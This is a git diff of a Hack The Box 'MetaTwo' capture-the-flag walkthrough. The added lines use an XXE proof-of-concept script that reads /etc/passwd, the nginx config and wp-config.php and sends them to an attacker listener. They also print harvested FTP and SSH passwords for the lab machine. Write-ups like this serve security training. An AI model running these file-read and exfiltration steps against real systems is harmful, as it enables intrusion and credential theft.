@@ -1,4 +1,4 @@
-# Box: MetaTwo
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/1e7bd42f-25cc-451d-a6c6-f401a0036609)# Box: MetaTwo
 # Level: Easy
 # OS: Linux
 <hr>
@@ -55,7 +55,7 @@ Lets exploit this
 
 
 
-# Exploitation
+# Exploitation (port 80)
 
 You can download the exploit we'll be using [here](https://github.com/destr4ct/CVE-2022-0739/blob/main/booking-press-expl.py)
 
@@ -159,10 +159,94 @@ echo zlib_decode(base64_decode('base64_here'));
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/cee5b0e3-f8fd-4ec9-866d-f19b1e6c3267)
 
-nice nice, we were able to read the ```/etc/passwd``` file
+nice nice, we can read the ```/etc/passwd``` file.
+
+Using wappalyzer you'll see that it’s a nginx server, we can check the default file structure and receive it’s config first. (etc/nginx/nginx.conf)
+
+command:```python PoC.py -l 10.10.14.153 -p 1234 -f /etc/nginx/sites-enabled/default```
+
+Uploading the payload.wav file should get you this
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2950fc21-de73-4308-84a4-478011aebee6)
+
+Decoding this
+
+```
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/metatwo]
+└─$ gedit decode.php 
+                                                                                                                                                                                                                                             
+┌──(bl4ck4non👽bl4ck4non-sec)-[~/Downloads/HTB/metatwo]
+└─$ php decode.php
+server {
+
+        listen 80;
+        listen [::]:80;
+
+        root /var/www/metapress.htb/blog;
+
+        index index.php index.html;
+
+        if ($http_host != "metapress.htb") {
+                rewrite ^ http://metapress.htb/;
+        }
+
+        location / {
+                try_files $uri $uri/ /index.php?$args;
+        }
+    
+        location ~ \.php$ {
+                include snippets/fastcgi-php.conf;
+                fastcgi_pass unix:/var/run/php/php8.0-fpm.sock;
+        }
+
+        location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg)$ {
+                expires max;
+                log_not_found off;
+        }
+
+}
+```
+We can see the base directory to be ```/var/www/metapress.htb/blog```, knowing this we can try to read the ```wp-config.php``` file
+
+command:```python PoC.py -l 10.10.14.153 -p 1234 -f /var/www/metapress.htb/blog/wp-config.php```
+
+You should get this when you upload the payload.wav file
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/6df13a04-b472-466d-82fb-36890a2fafe4)
+
+Decoding this,
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0e12933b-43d0-4446-b206-dc75d759b3ca)
+
+We foumd ftp creds, lets login to the ftp server with this
+
+# Enumeration (Port 21)
+
+username:```metapress.htb```      password:```9NYS_ii@FyL_p5M2NvJ```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/291709a7-1f2f-43ce-b9c9-809a73feda59)
+
+We are in😎
+
+In the ```mailer``` directory there's a file ```send_email.php```, download this file to your machine using the ```get``` command
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0118634e-8859-40e4-8791-2ae547e2177b)
+
+Lets view the file we downloaded
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/4c57ef69-5ee2-4be3-b374-33f11fda38b5)
+
+nice nice, we found creds for user ```jnelson```, lets ssh into the server using this
+
+username:```jnelson```       password:```Cb4_JmWM8zUZWMu@Ys```
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/031a3a0c-b1d9-424c-8584-bd73847a1edc)
+
+We are in😎. Lets go ahead to escalate our privileges
 
 
 
+# Privilege Escalation
 
 
 
